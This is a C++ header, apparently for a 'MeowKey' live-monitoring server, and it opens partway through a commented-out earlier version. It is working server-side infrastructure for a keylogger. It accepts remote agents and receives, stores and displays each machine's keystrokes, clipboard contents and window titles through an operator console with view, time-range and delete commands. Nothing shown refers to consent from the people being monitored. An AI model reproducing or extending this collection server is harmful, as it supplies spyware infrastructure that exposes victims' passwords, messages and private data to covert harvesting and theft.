//         cout << "║ Status: RUNNING                                           ║" << endl;
//         cout << "║ Port: " << port_ << "                                              ║" << endl;
//         cout << "║ Database: " << storage_file_ << "                               ║" << endl;
//         cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
//         cout << "║ COMMANDS:                                                 ║" << endl;
//         cout << "║   accept <id>      - Accept pending client                ║" << endl;
//         cout << "║   reject <id>      - Reject pending client                ║" << endl;
//         cout << "║   kick <id>        - Disconnect active client             ║" << endl;
//         cout << "║   list             - Show active/pending clients          ║" << endl;
//         cout << "║   clients          - Show all registered clients          ║" << endl;
//         cout << "║   view <id> <type> - View client data (ks/clip/win/all)   ║" << endl;
//         cout << "║   range <id> s e   - Time range query (microseconds)     ║" << endl;
//         cout << "║   flush [id]       - Flush buffers (all or specific)      ║" << endl;
//         cout << "║   delete <id>      - Delete client and all data           ║" << endl;
//         cout << "║   stats            - Show database statistics             ║" << endl;
//         cout << "║   help             - Show this help                      ║" << endl;
//         cout << "║   quit             - Stop server                         ║" << endl;
//         cout << "╚═══════════════════════════════════════════════════════════╝\n"
//              << endl;
//     }

//     void acceptLoop()
//     {
//         try
//         {
//             server_socket_ = SocketUtils::createSocket();
// #ifndef _WIN32
//             int flags = fcntl(server_socket_, F_GETFL, 0);
//             fcntl(server_socket_, F_SETFL, flags | O_NONBLOCK);
// #endif
//             SocketUtils::bindSocket(server_socket_, port_);
//             SocketUtils::listenSocket(server_socket_);
//             cout << "🔊 Listening on port " << port_ << "...\n"
//                  << endl;

//             while (running_)
//             {
//                 int client_sock = accept(server_socket_, nullptr, nullptr);
//                 if (client_sock < 0)
//                 {
// #ifndef _WIN32
//                     if (errno == EAGAIN || errno == EWOULDBLOCK)
//                     {
//                         this_thread::sleep_for(chrono::milliseconds(50));
//                         continue;
//                     }
// #endif
//                     this_thread::sleep_for(chrono::milliseconds(50));
//                     continue;
//                 }

//                 string line = readHandshakeLine(client_sock, 1500);
//                 if (line.empty())
//                 {
// #ifdef _WIN32
//                     closesocket(client_sock);
// #else
//                     close(client_sock);
// #endif
//                     continue;
//                 }

//                 string id;
//                 size_t col = line.find(':');
//                 if (col != string::npos)
//                 {
//                     id = line.substr(col + 1);
//                 }
//                 else
//                 {
//                     id = line;
//                 }
//                 size_t st = id.find_first_not_of(" \t\r\n");
//                 size_t ed = id.find_last_not_of(" \t\r\n");
//                 if (st == string::npos)
//                     id.clear();
//                 else
//                     id = id.substr(st, ed - st + 1);

//                 if (id.empty())
//                 {
// #ifdef _WIN32
//                     closesocket(client_sock);
// #else
//                     close(client_sock);
// #endif
//                     continue;
//                 }

//                 handleNewConnectionSocket(client_sock, id);
//             }
//         }
//         catch (const exception &e)
//         {
//             if (running_)
//                 cerr << "❌ Accept loop error: " << e.what() << endl;
//         }
//     }

//     void acceptClient(const string &client_id)
//     {
//         lock_guard<mutex> lock(clients_mutex_);
//         auto it = pending_clients_.find(client_id);
//         if (it == pending_clients_.end())
//         {
//             cout << "❌ Client '" << client_id << "' not in pending list!" << endl;
//             return;
//         }

//         auto handler = move(it->second);
//         pending_clients_.erase(it);

//         // ✅ CRITICAL: Register client FIRST
//         ClientRecord rec;
//         bool existing = db_->registerClient(client_id, rec);

//         // ✅ CRITICAL: Sync immediately after registration
//         cout << "💾 [REGISTER SYNC] Persisting client registration for " << client_id << endl;
//         db_->syncToDisk();

//         cout << (existing ? "✅ Returning" : "🆕 New") << " client registered: " << client_id << endl;

//         // Send approval
//         string msg = "APPROVED\n";
//         send(handler->getSocket(), msg.c_str(), (int)msg.size(), 0);

//         // NOW start handler
//         handler->start();
//         active_clients_[client_id] = move(handler);

//         cout << "✅ Client handler thread started for: " << client_id << endl;
//     }

//     void rejectClient(const string &client_id)
//     {
//         lock_guard<mutex> lock(clients_mutex_);
//         auto it = pending_clients_.find(client_id);
//         if (it == pending_clients_.end())
//         {
//             cout << "❌ Client '" << client_id << "' not in pending list!" << endl;
//             return;
//         }
//         auto handler = move(it->second);
//         pending_clients_.erase(it);
//         string msg = "REJECTED\n";
//         send(handler->getSocket(), msg.c_str(), (int)msg.size(), 0);
//         handler->stop();
//         cout << "❌ Client rejected: " << client_id << endl;
//     }

//     void kickClient(const string &client_id)
//     {
//         lock_guard<mutex> lock(clients_mutex_);
//         auto it = active_clients_.find(client_id);
//         if (it != active_clients_.end())
//         {
//             cout << "💾 [KICK SYNC] Persisting data before kicking " << client_id << endl;
//             db_->syncToDisk();
//             it->second->stop();
//             active_clients_.erase(it);
//             cout << "✅ Client kicked: " << client_id << endl;
//             return;
//         }
//         it = pending_clients_.find(client_id);
//         if (it != pending_clients_.end())
//         {
//             it->second->stop();
//             pending_clients_.erase(it);
//             cout << "✅ Pending client removed: " << client_id << endl;
//             return;
//         }
//         cout << "❌ Client not found!" << endl;
//     }

//     void listClients()
//     {
//         lock_guard<mutex> lock(clients_mutex_);
//         cout << "\nPENDING (" << pending_clients_.size() << "):" << endl;
//         if (pending_clients_.empty())
//             cout << "  (none)\n";
//         else
//             for (auto &p : pending_clients_)
//                 cout << "  " << p.first << endl;
//         cout << "\nACTIVE (" << active_clients_.size() << "):" << endl;
//         if (active_clients_.empty())
//             cout << "  (none)\n";
//         else
//             for (auto &p : active_clients_)
//                 cout << "  " << p.first << endl;
//     }

//     void showAllClients()
//     {
//         auto clients = db_->getAllClients();
//         cout << "\nALL REGISTERED CLIENTS IN DATABASE:" << endl;
//         if (clients.empty())
//         {
//             cout << "  (no clients in database)\n";
//             return;
//         }
//         for (auto &c : clients)
//         {
//             ClientRecord r;
//             db_->getClientStats(c, r);
//             cout << "  * " << c << " | Sessions: " << r.session_count
//                  << " KS:" << r.total_keystrokes << " CB:" << r.total_clipboard << " W:" << r.total_windows << endl;
//         }
//     }

//     void viewClientData(const string &client_id, const string &type)
//     {
//         if (!db_->clientExists(client_id))
//         {
//             cout << "❌ Client '" << client_id << "' not found!" << endl;
//             return;
//         }
//         QueryResult res;
//         if (!db_->queryClientAllEvents(client_id, res))
//         {
//             cout << "❌ Failed to query client data!" << endl;
//             return;
//         }

//         cout << "\nDATA FOR CLIENT: " << client_id << endl;
//         if (type == "all" || type == "keystroke" || type == "ks")
//         {
//             cout << "\nKEYSTROKES (" << res.keystrokes.size() << "):\n";
//             for (size_t i = 0; i < res.keystrokes.size(); ++i)
//             {
//                 cout << "  " << (i + 1) << ". [" << res.keystrokes[i].timestamp << "] " << res.keystrokes[i].key << "\n";
//             }
//         }
//         if (type == "all" || type == "clipboard" || type == "clip")
//         {
//             cout << "\nCLIPBOARD (" << res.clipboard_events.size() << "):\n";
//             for (size_t i = 0; i < res.clipboard_events.size(); ++i)
//             {
//                 string s(res.clipboard_events[i].content, res.clipboard_events[i].content_length);
//                 cout << "  " << (i + 1) << ". [" << res.clipboard_events[i].timestamp << "] " << s << "\n";
//             }
//         }
//         if (type == "all" || type == "window" || type == "win")
//         {
//             cout << "\nWINDOWS (" << res.window_events.size() << "):\n";
//             for (size_t i = 0; i < res.window_events.size(); ++i)
//             {
//                 cout << "  " << (i + 1) << ". [" << res.window_events[i].timestamp << "] "
//                      << res.window_events[i].title << " [" << res.window_events[i].process << "]\n";
//             }
//         }
//     }

//     void viewRangedData(const string &client_id, uint64_t start_ts, uint64_t end_ts)
//     {
//         if (!db_->clientExists(client_id))
//         {
//             cout << "❌ Client not found!\n";
//             return;
//         }
//         QueryResult res;
//         if (!db_->queryClientEventsByTimeRange(client_id, start_ts, end_ts, res))
//         {
//             cout << "❌ Query failed!\n";
//             return;
//         }
//         cout << "Range results: Total=" << res.totalEvents() << " KS=" << res.keystrokes.size()
//              << " CB=" << res.clipboard_events.size() << " W=" << res.window_events.size() << endl;
//     }

//     void flushClient(const string &client_id)
//     {
//         cout << "💾 [FLUSH] Syncing all data to disk" << endl;
//         db_->syncToDisk();
//         cout << "✅ All data flushed" << endl;
//     }

//     void flushAllClients()
//     {
//         cout << "💾 [FLUSH ALL] Syncing entire database to disk" << endl;
//         db_->syncToDisk();
//         cout << "✅ Database flushed" << endl;
//     }

//     void deleteClient(const string &client_id)
//     {
//         kickClient(client_id);
//         if (db_->deleteClient(client_id))
//             cout << "✅ Deleted client: " << client_id << endl;
//         else
//             cout << "❌ Delete failed or client not present." << endl;
//     }

//     void showStats()
//     {
//         db_->printStats();
//     }

   
// };

// #endif




#ifndef SERVER_CROSS_HPP
#define SERVER_CROSS_HPP

#include "../socket_utils_cross.hpp"
#include "../meowkey_database.hpp"
#include <thread>
#include <atomic>
#include <unordered_map>
#include <mutex>
#include <deque>
#include <sstream>
#include <iostream>
#include <memory>
#include <iomanip>
#include <chrono>
#include <cstring>
#include <vector>

#ifdef _WIN32
#include <winsock2.h>
#else
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#endif

using namespace std;

class ClientHandler {
private:
    int client_socket_;
    atomic<bool> running_;
    thread handler_thread_;
    string client_id_;
    uint32_t client_hash_;
    shared_ptr<MeowKeyDatabase> db_;
    
    deque<string> recent_events_;
    static mutex display_mutex_;
    
    atomic<int> events_since_sync_;
    static const int SYNC_INTERVAL = 10;

    void displayRecentEvents() {
        lock_guard<mutex> lock(display_mutex_);
        cout << "\n=== " << client_id_ << string(45 - client_id_.length(), '-') << "===" << endl;
        if (recent_events_.empty()) {
            cout << "| (No events)" << string(47, ' ') << "|" << endl;
        } else {
            for (const auto &e : recent_events_) {
                cout << "| " << left << setw(50) << e.substr(0,50) << "|" << endl;
            }
        }
        cout << string(60, '=') << endl;
    }

    void pushRecent(const string &s) {
        lock_guard<mutex> lock(display_mutex_);
        recent_events_.push_back(s);
        if (recent_events_.size() > 20) recent_events_.pop_front();
    }

    void processEventLine(const string &line) {
        if (line.empty()) return;
        
        uint64_t ts = MeowKeyDatabase::getCurrentTimestamp();
        string msg = line;
        
        // Remove trailing whitespace
        while (!msg.empty() && (msg.back() == '\n' || msg.back() == '\r')) 
            msg.pop_back();
        if (msg.empty()) return;
        
        try {
            if (msg.rfind("KEY:", 0) == 0) {
                string key = msg.substr(4);
                if (!key.empty() && key[0] == ' ') key.erase(0,1);
                
                KeystrokeEvent ke(ts, client_hash_, key);
                db_->insertKeystroke(client_hash_, ke);
                
                pushRecent("[KEY] " + key);
                cout << "✓ Keystroke: " << key << endl;
                
            } else if (msg.rfind("CLIPBOARD:", 0) == 0) {
                string content = msg.substr(10);
                if (!content.empty() && content[0] == ' ') content.erase(0,1);
                
                ClipboardEvent ce(ts, client_hash_, content);
                db_->insertClipboard(client_hash_, ce);
                
                string preview = content.substr(0, 30);
                if (content.size() > 30) preview += "...";
                pushRecent("[CLIP] " + preview);
                cout << "✓ Clipboard: " << preview << endl;
                
            } else if (msg.rfind("WINDOW:", 0) == 0) {
                string window = msg.substr(7);
                if (!window.empty() && window[0] == ' ') window.erase(0,1);
                
                string title = window;
                string process = "Unknown";
                size_t br = window.rfind(" [");
                if (br != string::npos && window.back() == ']') {
                    title = window.substr(0, br);
                    process = window.substr(br + 2, window.size() - br - 3);
                }
                
                WindowEvent we(ts, client_hash_, title, process);
                db_->insertWindow(client_hash_, we);
                
                pushRecent("[WIN] " + title.substr(0, 30));
                cout << "✓ Window: " << title.substr(0, 30) << endl;
                
            } else {
                // Treat as keystroke
                KeystrokeEvent ke(ts, client_hash_, msg);
                db_->insertKeystroke(client_hash_, ke);
                pushRecent("[KEY] " + msg);
                cout << "✓ Keystroke (raw): " << msg << endl;
            }
            
            displayRecentEvents();
            
            // Periodic sync
            events_since_sync_++;
            if (events_since_sync_ >= SYNC_INTERVAL) {
                db_->syncToDisk();
                events_since_sync_ = 0;
            }
            
        } catch (const exception &e) {
            cerr << "❌ Error: " << e.what() << endl;
        }
    }

    void clientLoop() {
        char buffer[4096];
        string leftover;
        
        cout << "👂 Client " << client_id_ << " connected" << endl;
        
        while (running_) {
            ssize_t received = recv(client_socket_, buffer, sizeof(buffer)-1, 0);
            if (received <= 0) {
                if (received == 0) cout << "🔌 Client " << client_id_ << " disconnected" << endl;
                else cerr << "❌ recv error: " << errno << endl;
                break;
            }
            
            buffer[received] = '\0';
            string data = leftover + string(buffer);
            leftover.clear();
            
            istringstream stream(data);
            string line;
            while (getline(stream, line)) {
                if (stream.eof() && !data.empty() && data.back() != '\n') {
                    leftover = line;
                    break;
                }
                if (!line.empty()) processEventLine(line);
            }
        }
        
        // Final sync
        cout << "💾 Final sync for " << client_id_ << endl;
        db_->syncToDisk();
        cout << "✅ " << client_id_ << " disconnected" << endl;
    }

public:
    ClientHandler(int sock, const string &id, shared_ptr<MeowKeyDatabase> db)
        : client_socket_(sock), running_(false), client_id_(id), 
          db_(db), events_since_sync_(0) {
        client_hash_ = ClientRecord::hashString(client_id_);
    }
    
    ~ClientHandler() { stop(); }
    
    int getSocket() const { return client_socket_; }

    void start() {
        running_ = true;
        handler_thread_ = thread([this] { clientLoop(); });
    }
    
    void stop() {
        if (!running_) return;
        running_ = false;
        
#ifdef _WIN32
        shutdown(client_socket_, SD_BOTH);
        closesocket(client_socket_);
#else
        shutdown(client_socket_, SHUT_RDWR);
        close(client_socket_);
#endif
        
        if (handler_thread_.joinable()) handler_thread_.join();
        cout << "[Handler stopped: " << client_id_ << "]" << endl;
    }
    
    string getClientId() const { return client_id_; }
    bool isRunning() const { return running_; }
};

mutex ClientHandler::display_mutex_;

class Server {
private:
    int port_;
    int server_socket_;
    atomic<bool> running_;
    thread accept_thread_;
    
    unordered_map<string, unique_ptr<ClientHandler>> pending_clients_;
    unordered_map<string, unique_ptr<ClientHandler>> active_clients_;
    mutex clients_mutex_;
    
    shared_ptr<MeowKeyDatabase> db_;
    string db_file_;

    string readHandshakeLine(int sock) {
        char buffer[1024];
        ssize_t received = recv(sock, buffer, sizeof(buffer)-1, 0);
        if (received <= 0) return "";
        
        buffer[received] = '\0';
        string line(buffer);
        size_t end = line.find_first_of("\r\n");
        if (end != string::npos) line = line.substr(0, end);
        return line;
    }

public:
    Server(int port, const string &db_file = "meowkey_server.db")
        : port_(port), server_socket_(-1), running_(false), db_file_(db_file) {
        
        db_ = make_shared<MeowKeyDatabase>(db_file_);
        if (!db_->open()) {
            throw runtime_error("Failed to open database");
        }
        cout << "✅ Database: " << db_file_ << endl;
        db_->printStats();
    }
    
    ~Server() { stop(); }
    
    bool start() {
        if (running_) return false;
        running_ = true;
        
        server_socket_ = SocketUtils::createSocket();
        SocketUtils::bindSocket(server_socket_, port_);
        SocketUtils::listenSocket(server_socket_);
        
        accept_thread_ = thread(&Server::acceptLoop, this);
        printBanner();
        return true;
    }
    
//     void stop() {
//         cout << "\n⏹️ Stopping server..." << endl;
//         running_ = false;
        
//         if (server_socket_ >= 0) {
// #ifdef _WIN32
//             closesocket(server_socket_);
// #else
//             close(server_socket_);
// #endif
//             server_socket_ = -1;
//         }
        
//         if (accept_thread_.joinable()) accept_thread_.join();
        
//         {
//             lock_guard<mutex> lock(clients_mutex_);
//             for (auto &client : active_clients_) client.second->stop();
//             for (auto &client : pending_clients_) client.second->stop();
//             active_clients_.clear();
//             pending_clients_.clear();
//         }
        
//         if (db_) {
//             db_->syncToDisk();
//             db_->close();
//         }
        
//         SocketUtils::cleanupWSA();
//         cout << "✅ Server stopped" << endl;
//     }



void stop()
{
    cout << "\n⏹️  Shutting down server..." << endl;
    running_ = false;

    if (server_socket_ >= 0)
    {
#ifdef _WIN32
        closesocket(server_socket_);
#else
        shutdown(server_socket_, SHUT_RDWR);
        close(server_socket_);
#endif
        server_socket_ = -1;
    }

    if (accept_thread_.joinable())
        accept_thread_.join();

    {
        lock_guard<mutex> lock(clients_mutex_);
        // Stop all active clients FIRST to flush their data
        for (auto &p : active_clients_)
        {
            cout << "💾 Flushing data for client: " << p.first << endl;
            p.second->stop(); // Each client syncs its data
        }
        active_clients_.clear();

        // Stop pending clients
        for (auto &p : pending_clients_)
            p.second->stop();
        pending_clients_.clear();
    }

    // Now safe to sync DB and close file
    if (db_)
    {
        cout << "💾 Final database sync to disk..." << endl;
        db_->syncToDisk();
        db_->close(); // Close FD AFTER syncing
    }

    SocketUtils::cleanupWSA();
    cout << "✅ Server shutdown complete" << endl;
}



    void runCommandLoop() {
        string line;
        while (running_) {
            cout << "meowkey> ";
            if (!getline(cin, line)) break;
            if (line.empty()) continue;
            processCommand(line);
        }
    }
    
    void processCommand(const string &cmd) {
        istringstream iss(cmd);
        string command;
        iss >> command;
        
        if (command == "accept") {
            string id;
            if (iss >> id) acceptClient(id);
            else cout << "Usage: accept <id>" << endl;
            
        } else if (command == "reject") {
            string id;
            if (iss >> id) rejectClient(id);
            else cout << "Usage: reject <id>" << endl;
            
        } else if (command == "kick") {
            string id;
            if (iss >> id) kickClient(id);
            else cout << "Usage: kick <id>" << endl;
            
        } else if (command == "list") {
            listClients();
            
        } else if (command == "clients") {
            showAllClients();
            
        } else if (command == "view") {
            string id, type = "all";
            if (iss >> id) { 
                iss >> type; 
                viewClientData(id, type); 
            } else {
                cout << "Usage: view <id> [ks|clip|win|all]" << endl;
            }
            
        } else if (command == "stats") {
            db_->printStats();
            
        } else if (command == "flush") {
            db_->syncToDisk();
            cout << "✅ Database synced" << endl;
            
        } else if (command == "delete") {
            string id;
            if (iss >> id) deleteClient(id);
            else cout << "Usage: delete <id>" << endl;
            
        } else if (command == "help") {
            printBanner();
            
        } else if (command == "quit" || command == "exit") {
            stop();
            
        } else {
            cout << "Unknown command. Type 'help'." << endl;
        }
    }

private:
    void printBanner() {
        cout << "\n╔═══════════════════════════════════════════════════════════╗" << endl;
        cout << "║        🐱 MEOWKEY SERVER - LIVE MONITORING 🐱             ║" << endl;
        cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
        cout << "║ Status: RUNNING                                           ║" << endl;
        cout << "║ Port: " << port_ << string(46 - to_string(port_).length(), ' ') << "║" << endl;
        cout << "║ Database: " << db_file_ << string(41 - db_file_.length(), ' ') << "║" << endl;
        cout << "╠═══════════════════════════════════════════════════════════╣" << endl;
        cout << "║ COMMANDS:                                                 ║" << endl;
        cout << "║   accept <id>      - Accept pending client                ║" << endl;
        cout << "║   reject <id>      - Reject pending client                ║" << endl;
        cout << "║   kick <id>        - Disconnect active client             ║" << endl;
        cout << "║   list             - Show active/pending clients          ║" << endl;
        cout << "║   clients          - Show all registered clients          ║" << endl;
        cout << "║   view <id> <type> - View client data (ks/clip/win/all)   ║" << endl;
        cout << "║   flush            - Flush all data to disk               ║" << endl;
        cout << "║   delete <id>      - Delete client and all data           ║" << endl;
        cout << "║   stats            - Show database statistics             ║" << endl;
        cout << "║   help             - Show this help                      ║" << endl;
        cout << "║   quit             - Stop server                         ║" << endl;
        cout << "╚═══════════════════════════════════════════════════════════╝\n" << endl;
    }
    
    void acceptLoop() {
        cout << "🔊 Listening on port " << port_ << "..." << endl;
        
        while (running_) {
            int client_sock = accept(server_socket_, nullptr, nullptr);
            if (client_sock < 0) {
#ifdef _WIN32
                if (WSAGetLastError() == WSAEWOULDBLOCK) {
                    this_thread::sleep_for(chrono::milliseconds(100));
                    continue;
                }
#else
                if (errno == EAGAIN || errno == EWOULDBLOCK) {
                    this_thread::sleep_for(chrono::milliseconds(100));
                    continue;
                }
#endif
                cerr << "❌ Accept error: " << errno << endl;
                continue;
            }
            
            string handshake = readHandshakeLine(client_sock);
            if (handshake.empty()) {
#ifdef _WIN32
                closesocket(client_sock);
#else
                close(client_sock);
#endif
                continue;
            }
            
            string client_id;
            size_t colon = handshake.find(':');
            if (colon != string::npos) {
                client_id = handshake.substr(colon + 1);
                // Trim whitespace
                size_t start = client_id.find_first_not_of(" \t\r\n");
                size_t end = client_id.find_last_not_of(" \t\r\n");
                if (start != string::npos) {
                    client_id = client_id.substr(start, end - start + 1);
                }
            } else {
                client_id = handshake;
            }
            
            if (client_id.empty()) {
#ifdef _WIN32
                closesocket(client_sock);
#else
                close(client_sock);
#endif
                continue;
            }
            
            handleNewConnection(client_sock, client_id);
        }
    }
    
    void handleNewConnection(int sock, const string &client_id) {
        lock_guard<mutex> lock(clients_mutex_);
        
        if (pending_clients_.count(client_id) || active_clients_.count(client_id)) {
            cout << "❌ Client " << client_id << " already connected" << endl;
            string msg = "ERROR: Already connected\n";
            send(sock, msg.c_str(), msg.size(), 0);
#ifdef _WIN32
            closesocket(sock);
#else
            close(sock);
#endif
            return;
        }
        
        cout << "\n🔔 NEW CONNECTION REQUEST" << endl;
        cout << "   Client ID: " << client_id << endl;
        cout << "   Action: accept " << client_id << " | reject " << client_id << endl;
        cout << string(40, '-') << endl;
        
        pending_clients_[client_id] = make_unique<ClientHandler>(sock, client_id, db_);
    }
    
    void acceptClient(const string &client_id) {
        lock_guard<mutex> lock(clients_mutex_);
        
        auto it = pending_clients_.find(client_id);
        if (it == pending_clients_.end()) {
            cout << "❌ Client not in pending list: " << client_id << endl;
            return;
        }
        
        auto handler = move(it->second);
        pending_clients_.erase(it);
        
        // Register client in database
        ClientRecord record;
        bool existing = db_->registerClient(client_id, record);
        
        // Send approval
        string msg = "APPROVED\n";
        send(handler->getSocket(), msg.c_str(), msg.size(), 0);
        
        // Start handler
        handler->start();
        active_clients_[client_id] = move(handler);
        
        cout << "✅ Client accepted: " << client_id << endl;
    }
    
    void rejectClient(const string &client_id) {
        lock_guard<mutex> lock(clients_mutex_);
        
        auto it = pending_clients_.find(client_id);
        if (it == pending_clients_.end()) {
            cout << "❌ Client not in pending list: " << client_id << endl;
            return;
        }
        
        string msg = "REJECTED\n";
        send(it->second->getSocket(), msg.c_str(), msg.size(), 0);
        it->second->stop();
        pending_clients_.erase(it);
        
        cout << "❌ Client rejected: " << client_id << endl;
    }
    
    void kickClient(const string &client_id) {
        lock_guard<mutex> lock(clients_mutex_);
        
        auto it = active_clients_.find(client_id);
        if (it != active_clients_.end()) {
            it->second->stop();
            active_clients_.erase(it);
            cout << "✅ Client kicked: " << client_id << endl;
            return;
        }
        
        it = pending_clients_.find(client_id);
        if (it != pending_clients_.end()) {
            it->second->stop();
            pending_clients_.erase(it);
            cout << "✅ Pending client removed: " << client_id << endl;
            return;
        }
        
        cout << "❌ Client not found: " << client_id << endl;
    }
    
    void listClients() {
        lock_guard<mutex> lock(clients_mutex_);
        
        cout << "\nPENDING (" << pending_clients_.size() << "):" << endl;
        if (pending_clients_.empty()) cout << "  (none)" << endl;
        else for (auto &p : pending_clients_) cout << "  " << p.first << endl;
        
        cout << "\nACTIVE (" << active_clients_.size() << "):" << endl;
        if (active_clients_.empty()) cout << "  (none)" << endl;
        else for (auto &p : active_clients_) cout << "  " << p.first << endl;
    }
    
    void showAllClients() {
        auto clients = db_->getAllClients();
        cout << "\nALL REGISTERED CLIENTS IN DATABASE:" << endl;
        if (clients.empty()) {
            cout << "  (no clients)" << endl;
            return;
        }
        for (auto &id : clients) {
            ClientRecord rec;
            if (db_->getClientStats(id, rec)) {
                cout << "  * " << id << " | Sessions: " << rec.session_count
                     << " KS:" << rec.total_keystrokes 
                     << " CB:" << rec.total_clipboard
                     << " W:" << rec.total_windows << endl;
            }
        }
    }
    
    void viewClientData(const string &client_id, const string &type) {
        QueryResult result;
        if (!db_->queryClientAllEvents(client_id, result)) {
            cout << "❌ Failed to query client: " << client_id << endl;
            return;
        }
        
        cout << "\nDATA FOR CLIENT: " << client_id << endl;
        
        if (type == "all" || type == "ks") {
            cout << "\nKEYSTROKES (" << result.keystrokes.size() << "):" << endl;
            for (size_t i = 0; i < result.keystrokes.size(); ++i) {
                cout << "  " << (i+1) << ". [" << result.keystrokes[i].timestamp 
                     << "] " << result.keystrokes[i].key << endl;
            }
        }
        
        if (type == "all" || type == "clip") {
            cout << "\nCLIPBOARD (" << result.clipboard_events.size() << "):" << endl;
            for (size_t i = 0; i < result.clipboard_events.size(); ++i) {
                string content(result.clipboard_events[i].content, 
                              result.clipboard_events[i].content_length);
                cout << "  " << (i+1) << ". [" << result.clipboard_events[i].timestamp 
                     << "] " << content.substr(0, 50);
                if (content.size() > 50) cout << "...";
                cout << endl;
            }
        }
        
        if (type == "all" || type == "win") {
            cout << "\nWINDOWS (" << result.window_events.size() << "):" << endl;
            for (size_t i = 0; i < result.window_events.size(); ++i) {
                cout << "  " << (i+1) << ". [" << result.window_events[i].timestamp 
                     << "] " << result.window_events[i].title 
                     << " [" << result.window_events[i].process << "]" << endl;
            }
        }
    }
    
    void deleteClient(const string &client_id) {
        kickClient(client_id);
        if (db_->deleteClient(client_id)) {
            cout << "✅ Client deleted: " << client_id << endl;
        } else {
            cout << "❌ Delete failed: " << client_id << endl;
        }
    }
};

#endif